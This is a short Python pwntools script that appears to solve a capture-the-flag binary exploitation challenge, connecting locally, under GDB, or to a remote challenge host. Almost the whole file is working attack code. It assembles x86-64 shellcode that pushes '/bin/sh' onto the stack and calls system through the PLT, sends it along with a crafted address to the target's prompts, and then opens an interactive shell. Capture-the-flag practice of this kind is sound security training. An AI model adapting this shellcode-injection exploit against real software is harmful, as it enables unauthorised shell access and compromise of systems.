from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
b main
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("0.cloud.chals.io", 16306)
    else:
        return process(e.path)


def shellcode():
	shell = asm("""
		pop  r9					     	 /* movaps */
		xor  rsi,	rsi				     /* clear rsi */
		push rsi						 /*push 0 on the stack*/
		mov  rdi, 0x68732f6e69622f		 /* binsh in reverse order*/
		push rdi
		push rsp		
		pop	rdi				             /* stack pointer to binsh */
		mov rcx, 0x401080                /* system in plt */					
		call rcx
""")
	return shell

p = start()
p.sendlineafter(b'powerful >>>', shellcode())
p.sendlineafter(b'MORE! >>>', p64(0xca110000))
p.sendlineafter(b'EEEE! >>>',b'A' * 8)
p.interactive()
